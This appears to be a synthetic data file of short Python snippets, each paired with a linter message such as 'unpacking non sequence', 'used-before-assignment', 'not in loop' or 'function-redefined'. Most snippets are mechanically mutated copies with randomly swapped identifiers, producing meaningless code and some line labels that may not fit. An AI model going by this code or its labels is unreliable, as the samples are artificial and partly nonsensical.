2   c: str = transform.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return bar(lambda x, y: incomparables + incomparables, date_format)
7   print(nearest_int([1, 2, 3, 4]))
8   import datetime
9   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"class Foo:
    def __init__(self, numbers):
        self.numbers = numbers


foo = Foo([1, 2, 3])
a, b, c = foo
print(a, b, c)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           DISCRETE_KINDS.numbers = domain
5   func = extended_breaks([1, 2, 3])
6   (ABC, probit_trans, nearest_int) = func
7   print(ABC, probit_trans, nearest_int)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           SECONDS.numbers = breaks
5   dataspace_is_numerical = Iterator([1, 2, 3])
6   (k, v, t) = dataspace_is_numerical
7   print(k, v, t)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           probit_trans.numbers = Iterator
5   current_date = kwargs([1, 2, 3])
6   (stats, dmin, trans_new) = current_date
7   print(stats, dmin, trans_new)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           dataspace_is_numerical.numbers = v1
5   limits = zero_range([1, 2, 3])
6   (timedelta_breaks, log_trans, vmax) = limits
7   print(timedelta_breaks, log_trans, vmax)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           v2.numbers = k
5   v1 = start([1, 2, 3])
6   (start, np, date_breaks) = v1
7   print(start, np, date_breaks)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           p.numbers = p
5   k = __all__([1, 2, 3])
6   (user_input, minor_breaks, accuracy) = k
7   print(user_input, minor_breaks, accuracy)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           kwargs.numbers = datetime
5   kwargs = timedelta_breaks([1, 2, 3])
6   (extended_breaks, OrderedDict, p) = kwargs
7   print(extended_breaks, OrderedDict, p)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           NANOSECONDS.numbers = sys
5   attr = func([1, 2, 3])
6   (vmin, p, finite) = attr
7   print(vmin, p, finite)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           _x.numbers = pd
5   _format = v1([1, 2, 3])
6   (aesthetic, klass_name, attr) = _format
7   print(aesthetic, klass_name, attr)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           transform.numbers = trans_minor_breaks
5   inverse = name([1, 2, 3])
6   (value, stats, mpl_format) = inverse
7   print(value, stats, mpl_format)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           DISCRETE_KINDS.numbers = x
5   transform = MethodType([1, 2, 3])
6   (f, t, data) = transform
7   print(f, t, data)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           SECONDS.numbers = pd
5   breaks_ = data([1, 2, 3])
6   (b, datetime, data) = breaks_
7   print(b, datetime, data)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           min_max.numbers = p
5   log10_trans = delta([1, 2, 3])
6   (obj, __all__, nomatch) = log10_trans
7   print(obj, __all__, nomatch)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           probability_trans.numbers = v2_indices
5   file_path = inverse([1, 2, 3])
6   (aesthetic, user_input, timedelta_breaks) = file_path
7   print(aesthetic, user_input, timedelta_breaks)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           foo.numbers = delta
5   c = n([1, 2, 3])
6   (stats, trans_minor_breaks, breaks) = c
7   print(stats, trans_minor_breaks, breaks)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           mpl_format.numbers = n
5   abstractmethod = span([1, 2, 3])
6   (dmin, d, t) = abstractmethod
7   print(dmin, d, t)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           name.numbers = bar
5   item = k([1, 2, 3])
6   (DISCRETE_KINDS, obj, log10_trans) = item
7   print(DISCRETE_KINDS, obj, log10_trans)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           np.numbers = timedelta_breaks
5   probit_trans = abstractmethod([1, 2, 3])
6   (np, func, minor_breaks) = probit_trans
7   print(np, func, minor_breaks)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           vmax.numbers = klass_name
5   datetime = extended_breaks([1, 2, 3])
6   (dmax, DISCRETE_KINDS, val) = datetime
7   print(dmax, DISCRETE_KINDS, val)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           data.numbers = nearest_int
5   lru_cache = probability_trans([1, 2, 3])
6   (print_values_but_five, stats, breaks) = lru_cache
7   print(print_values_but_five, stats, breaks)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           nearest_int.numbers = _get
5   SECONDS = trans_minor_breaks([1, 2, 3])
6   (timedelta_format, attr, date2num) = SECONDS
7   print(timedelta_format, attr, date2num)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           minor_breaks.numbers = NANOSECONDS
5   NANOSECONDS = myint([1, 2, 3])
6   (klass_name, SECONDS, obj) = NANOSECONDS
7   print(klass_name, SECONDS, obj)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           d.numbers = BaseClass
5   dataspace_is_numerical = d([1, 2, 3])
6   (rng, log_trans, num2date) = dataspace_is_numerical
7   print(rng, log_trans, num2date)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           MethodType.numbers = item
5   _x = v1([1, 2, 3])
6   (dmax, fh, user_input) = _x
7   print(dmax, fh, user_input)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           stats.numbers = breaks
5   v1_to_v2_map = transform([1, 2, 3])
6   (domain, cdists, Foo) = v1_to_v2_map
7   print(domain, cdists, Foo)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           contents.numbers = numbers
5   _trans = klass_name([1, 2, 3])
6   (start, name, transform) = _trans
7   print(start, name, transform)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           bar.numbers = inverse
5   reduce = MSG([1, 2, 3])
6   (vmax, Iterator, trans_new) = reduce
7   print(vmax, Iterator, trans_new)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           a.numbers = item
5   n = distribution([1, 2, 3])
6   (CONTINUOUS_KINDS, nomatch, d) = n
7   print(CONTINUOUS_KINDS, nomatch, d)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           _format.numbers = fh
5   trans_minor_breaks = _trans([1, 2, 3])
6   (dmin, b, vmax) = trans_minor_breaks
7   print(dmin, b, vmax)
",6 - error: unpacking non sequence
"1   class Foo:
2   
3       def __init__(self, numbers):
4           log2_trans.numbers = v2
5   datetime = log_format([1, 2, 3])
6   (klass_name, v1_to_v2_map, span) = datetime
7   print(klass_name, v1_to_v2_map, span)
",6 - error: unpacking non sequence
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   class Foo:
5   
6       def __init__(self, numbers):
7           v1.numbers = klass_name
8   transform = file_path([1, 2, 3])
9   (a, _x, k) = transform
10   print(a, _x, k)
11   import datetime
12   na_rm: str = i.date.today().strftime('%y-%m-%d')
",9 - error: unpacking non sequence
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           _format.numbers = limits
7   nearest_int = t([1, 2, 3])
8   (log10_trans, p, cdists) = nearest_int
9   print(log10_trans, p, cdists)
10   import datetime
11   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           zero_range.numbers = file_path
7   print_values_but_five = cdists([1, 2, 3])
8   (v, Foo, mpl_format) = print_values_but_five
9   print(v, Foo, mpl_format)
10   import datetime
11   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           _get.numbers = trans
7   p = accuracy([1, 2, 3])
8   (NANOSECONDS, NANOSECONDS, value) = p
9   print(NANOSECONDS, NANOSECONDS, value)
10   import datetime
11   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           accuracy.numbers = dmin
7   transform = date_breaks([1, 2, 3])
8   (incomparables, breaks_, chain) = transform
9   print(incomparables, breaks_, chain)
10   import datetime
11   obj: str = d.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           self.numbers = limits
7   ABC = contents([1, 2, 3])
8   (contents, CONTINUOUS_KINDS, zero_range) = ABC
9   print(contents, CONTINUOUS_KINDS, zero_range)
10   import datetime
11   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           __all__.numbers = Foo
7   user_input = stats([1, 2, 3])
8   (x, transform, MSG) = user_input
9   print(x, transform, MSG)
10   import datetime
11   v2: str = args.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           user_input.numbers = current_date
7   item = item([1, 2, 3])
8   (min_max, val, name) = item
9   print(min_max, val, name)
10   import datetime
11   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           msg.numbers = reduce
7   delta = dmax([1, 2, 3])
8   (data, print_values_but_five, nomatch) = delta
9   print(data, print_values_but_five, nomatch)
10   import datetime
11   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           c.numbers = attr
7   __all__ = bar([1, 2, 3])
8   (inverse, doc, _x) = __all__
9   print(inverse, doc, _x)
10   import datetime
11   v1: str = log_format.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           val.numbers = v1_to_v2_map
7   myint = NANOSECONDS([1, 2, 3])
8   (log_trans, np, trans_new) = myint
9   print(log_trans, np, trans_new)
10   import datetime
11   v2: str = c.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           name.numbers = start
7   trans_new = dmax([1, 2, 3])
8   (_format, var, dmax) = trans_new
9   print(_format, var, dmax)
10   import datetime
11   func: str = v1.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           p.numbers = contents
7   name = log_breaks([1, 2, 3])
8   (_trans, log_breaks, domain) = name
9   print(_trans, log_breaks, domain)
10   import datetime
11   v: str = contents.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           vmax.numbers = doc
7   datetime = chain([1, 2, 3])
8   (var, zero_range, CONTINUOUS_KINDS) = datetime
9   print(var, zero_range, CONTINUOUS_KINDS)
10   import datetime
11   c: str = transform.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   class Foo:
4   
5       def __init__(self, numbers):
6           breaks_.numbers = defaultdict
7   y = klass_name([1, 2, 3])
8   (func, attr, rng) = y
9   print(func, attr, rng)
10   import datetime
11   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",8 - error: unpacking non sequence
"if input():
    user_input = input()


print(user_input)
",5 - error: used-before-assignment
"1   if input():
2       defaultdict = input()
3   print(defaultdict)
",5 - error: used-before-assignment
"1   if input():
2       breaks_ = input()
3   print(breaks_)
",5 - error: used-before-assignment
"1   if input():
2       myint = input()
3   print(myint)
",5 - error: used-before-assignment
"1   if input():
2       file_path = input()
3   print(file_path)
",5 - error: used-before-assignment
"1   if input():
2       myint = input()
3   print(myint)
",5 - error: used-before-assignment
"1   if input():
2       abstractmethod = input()
3   print(abstractmethod)
",5 - error: used-before-assignment
"1   if input():
2       p = input()
3   print(p)
",5 - error: used-before-assignment
"1   if input():
2       minor_breaks = input()
3   print(minor_breaks)
",5 - error: used-before-assignment
"1   if input():
2       t = input()
3   print(t)
",5 - error: used-before-assignment
"1   if input():
2       np = input()
3   print(np)
",5 - error: used-before-assignment
"1   if input():
2       nomatch = input()
3   print(nomatch)
",5 - error: used-before-assignment
"1   if input():
2       stats = input()
3   print(stats)
",5 - error: used-before-assignment
"1   if input():
2       timedelta_format = input()
3   print(timedelta_format)
",5 - error: used-before-assignment
"1   if input():
2       k = input()
3   print(k)
",5 - error: used-before-assignment
"1   if input():
2       val = input()
3   print(val)
",5 - error: used-before-assignment
"1   if input():
2       v1 = input()
3   print(v1)
",5 - error: used-before-assignment
"1   if input():
2       _x = input()
3   print(_x)
",5 - error: used-before-assignment
"1   if input():
2       NANOSECONDS = input()
3   print(NANOSECONDS)
",5 - error: used-before-assignment
"1   if input():
2       incomparables = input()
3   print(incomparables)
",5 - error: used-before-assignment
"1   if input():
2       finite = input()
3   print(finite)
",5 - error: used-before-assignment
"1   if input():
2       aesthetic = input()
3   print(aesthetic)
",5 - error: used-before-assignment
"1   if input():
2       data = input()
3   print(data)
",5 - error: used-before-assignment
"1   if input():
2       value = input()
3   print(value)
",5 - error: used-before-assignment
"1   if input():
2       transform = input()
3   print(transform)
",5 - error: used-before-assignment
"1   if input():
2       na_rm = input()
3   print(na_rm)
",5 - error: used-before-assignment
"1   if input():
2       abstractmethod = input()
3   print(abstractmethod)
",5 - error: used-before-assignment
"1   if input():
2       c = input()
3   print(c)
",5 - error: used-before-assignment
"1   if input():
2       _format = input()
3   print(_format)
",5 - error: used-before-assignment
"1   if input():
2       p = input()
3   print(p)
",5 - error: used-before-assignment
"1   if input():
2       myint = input()
3   print(myint)
",5 - error: used-before-assignment
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   if input():
5       date_format = input()
6   print(date_format)
7   import datetime
8   na_rm: str = i.date.today().strftime('%y-%m-%d')
",8 - error: used-before-assignment
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   if input():
4       v1 = input()
5   print(v1)
6   import datetime
7   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   if input():
4       span = input()
5   print(span)
6   import datetime
7   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   if input():
4       nomatch = input()
5   print(nomatch)
6   import datetime
7   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   if input():
4       value = input()
5   print(value)
6   import datetime
7   obj: str = d.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   if input():
4       v = input()
5   print(v)
6   import datetime
7   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   if input():
4       cdists = input()
5   print(cdists)
6   import datetime
7   v2: str = args.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   if input():
4       p = input()
5   print(p)
6   import datetime
7   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   if input():
4       chain = input()
5   print(chain)
6   import datetime
7   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   if input():
4       user_input = input()
5   print(user_input)
6   import datetime
7   v1: str = log_format.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   if input():
4       dataspace_is_numerical = input()
5   print(dataspace_is_numerical)
6   import datetime
7   v2: str = c.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   if input():
4       v1_to_v2_map = input()
5   print(v1_to_v2_map)
6   import datetime
7   func: str = v1.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   if input():
4       lru_cache = input()
5   print(lru_cache)
6   import datetime
7   v: str = contents.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   if input():
4       vmin = input()
5   print(vmin)
6   import datetime
7   c: str = transform.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   if input():
4       sys = input()
5   print(sys)
6   import datetime
7   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",7 - error: used-before-assignment
"def print_values_but_five(value):
    if value:
        continue
    print(value)


for i in range(10):
    print_values_but_five(i)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if t:
3           continue
4       print(t)
5   for mpl_format in range(10):
6       na_rm(mpl_format)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if a:
3           continue
4       print(a)
5   for _trans in range(10):
6       min_max(_trans)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if distribution:
3           continue
4       print(distribution)
5   for probability_trans in range(10):
6       stats(probability_trans)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if OrderedDict:
3           continue
4       print(OrderedDict)
5   for func in range(10):
6       MSG(func)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if n:
3           continue
4       print(n)
5   for date2num in range(10):
6       user_input(date2num)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if timedelta_breaks:
3           continue
4       print(timedelta_breaks)
5   for Foo in range(10):
6       aesthetic(Foo)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if pd:
3           continue
4       print(pd)
5   for log2_trans in range(10):
6       _get(log2_trans)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if user_input:
3           continue
4       print(user_input)
5   for distribution in range(10):
6       dmin(distribution)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if span:
3           continue
4       print(span)
5   for trans in range(10):
6       trans_minor_breaks(trans)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if aesthetic:
3           continue
4       print(aesthetic)
5   for _trans in range(10):
6       probit_trans(_trans)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if lru_cache:
3           continue
4       print(lru_cache)
5   for vmin in range(10):
6       min_max(vmin)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if n:
3           continue
4       print(n)
5   for kwargs in range(10):
6       reduce(kwargs)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if dmax:
3           continue
4       print(dmax)
5   for v1 in range(10):
6       args(v1)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if cdists:
3           continue
4       print(cdists)
5   for log_trans in range(10):
6       v1_to_v2_map(log_trans)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if bar:
3           continue
4       print(bar)
5   for x in range(10):
6       func(x)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if chain:
3           continue
4       print(chain)
5   for types in range(10):
6       lru_cache(types)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if minor_breaks:
3           continue
4       print(minor_breaks)
5   for timedelta_format in range(10):
6       date_breaks(timedelta_format)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if n:
3           continue
4       print(n)
5   for val in range(10):
6       d(val)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if logit_trans:
3           continue
4       print(logit_trans)
5   for y in range(10):
6       n(y)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if aesthetic:
3           continue
4       print(aesthetic)
5   for log_format in range(10):
6       item(log_format)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if log_trans:
3           continue
4       print(log_trans)
5   for na_rm in range(10):
6       incomparables(na_rm)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if kwargs:
3           continue
4       print(kwargs)
5   for probability_trans in range(10):
6       breaks(probability_trans)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if breaks_:
3           continue
4       print(breaks_)
5   for item in range(10):
6       fh(item)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if mpl_format:
3           continue
4       print(mpl_format)
5   for logit_trans in range(10):
6       __all__(logit_trans)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if DISCRETE_KINDS:
3           continue
4       print(DISCRETE_KINDS)
5   for dmax in range(10):
6       __all__(dmax)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if BaseClass:
3           continue
4       print(BaseClass)
5   for SECONDS in range(10):
6       SECONDS(SECONDS)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if f:
3           continue
4       print(f)
5   for __all__ in range(10):
6       p(__all__)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if MethodType:
3           continue
4       print(MethodType)
5   for finite in range(10):
6       log_format(finite)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if contents:
3           continue
4       print(contents)
5   for v2 in range(10):
6       probability_trans(v2)
",2 - error: not in loop
"1   def print_values_but_five(value):
2       if timedelta_format:
3           continue
4       print(timedelta_format)
5   for date_format in range(10):
6       contents(date_format)
",2 - error: not in loop
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   def print_values_but_five(value):
5       if Foo:
6           continue
7       print(Foo)
8   for k in range(10):
9       self(k)
10   import datetime
11   na_rm: str = i.date.today().strftime('%y-%m-%d')
",5 - error: not in loop
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if numbers:
5           continue
6       print(numbers)
7   for skip in range(10):
8       np(skip)
9   import datetime
10   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if v1_to_v2_map:
5           continue
6       print(v1_to_v2_map)
7   for y in range(10):
8       reduce(y)
9   import datetime
10   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if log_breaks:
5           continue
6       print(log_breaks)
7   for v2_indices in range(10):
8       msg(v2_indices)
9   import datetime
10   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if v1_to_v2_map:
5           continue
6       print(v1_to_v2_map)
7   for aesthetic in range(10):
8       f(aesthetic)
9   import datetime
10   obj: str = d.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if limits:
5           continue
6       print(limits)
7   for func in range(10):
8       b(func)
9   import datetime
10   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if n:
5           continue
6       print(n)
7   for _x in range(10):
8       v(_x)
9   import datetime
10   v2: str = args.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if skip:
5           continue
6       print(skip)
7   for CONTINUOUS_KINDS in range(10):
8       d(CONTINUOUS_KINDS)
9   import datetime
10   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if self:
5           continue
6       print(self)
7   for v2_indices in range(10):
8       var(v2_indices)
9   import datetime
10   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if myint:
5           continue
6       print(myint)
7   for inverse in range(10):
8       attr(inverse)
9   import datetime
10   v1: str = log_format.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if trans_new:
5           continue
6       print(trans_new)
7   for y in range(10):
8       probability_trans(y)
9   import datetime
10   v2: str = c.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if na_rm:
5           continue
6       print(na_rm)
7   for n in range(10):
8       c(n)
9   import datetime
10   func: str = v1.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if user_input:
5           continue
6       print(user_input)
7   for var in range(10):
8       dataspace_is_numerical(var)
9   import datetime
10   v: str = contents.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if v1_to_v2_map:
5           continue
6       print(v1_to_v2_map)
7   for pd in range(10):
8       v(pd)
9   import datetime
10   c: str = transform.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   def print_values_but_five(value):
4       if start:
5           continue
6       print(start)
7   for aesthetic in range(10):
8       BaseClass(aesthetic)
9   import datetime
10   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",4 - error: not in loop
"def get_item():
    pass


def get_item():
    pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
",5 - warning: function-redefined
"1   def get_item():
2       pass
3   
4   def get_item():
5       pass
